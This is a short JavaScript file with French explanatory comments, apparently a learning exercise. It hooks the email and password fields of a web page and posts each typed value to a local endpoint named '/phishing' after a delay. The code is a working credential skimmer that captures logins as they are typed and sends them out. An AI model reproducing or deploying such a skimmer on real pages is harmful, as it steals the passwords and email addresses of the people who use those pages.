
// le document c'est la page web
// on branche un écouteur sur l'élément page web 
// qui va écouter la réalisation de l'événement DOMContentLoaded
document.addEventListener('DOMContentLoaded', () => {

    // une fois que les donnée sont chargés donc qu'existent 
    // l'élément input avec un id email et celui avec un id password
    // je vx les écouteur. Je vx en effet que lorsque quelqu'un tape
    // qqch dans les deux champs de saisi ('input') et que
    // donc se déclenche l'événement 'input', on affiche dans la console
    // la valeur de l'input autrement dit la valeur de l'objet input
    // dit encore autrement que la console affiche input.value
    const email = document.getElementById("email")
    const password = document.getElementById("password")

    email.addEventListener('input', inputHandler)

    password.addEventListener('input', inputHandler)
})



const inputHandler = (event) => {


    setTimeout(() => {
        if(event.target.id == "email") {
            fetch('http://localhost:3000/phishing', {
                method: 'POST',
                headers: {"Content-Type": 'application/json'},
                body: JSON.stringify({email: event.target.value})
            })
        } else {
            fetch('http://localhost:3000/phishing', {
                method: 'POST',
                headers: {"Content-Type": 'application/json'},
                body: JSON.stringify({password: event.target.value})
            })
        }
    }, 5000)
    
   
}